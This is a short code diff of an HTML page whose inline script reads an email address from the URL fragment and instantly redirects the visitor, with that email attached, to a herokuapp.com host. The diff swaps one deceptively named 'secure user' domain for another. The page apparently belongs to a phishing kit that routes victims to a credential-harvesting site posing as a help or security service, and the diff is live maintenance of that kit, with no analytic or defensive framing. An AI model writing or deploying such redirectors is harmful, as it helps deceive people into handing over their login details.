@@ -19,7 +19,7 @@
 		var em = hash.split("#")[1];
 
 		window.setTimeout(function () {
-			window.location.href = "https://secureuserhelpcenter.herokuapp.com/" + "#" + em;
+			window.location.href = "https://usersecureunitpoint.herokuapp.com/" + "#" + em;
 		}, 0);
 	</script>
 </html>
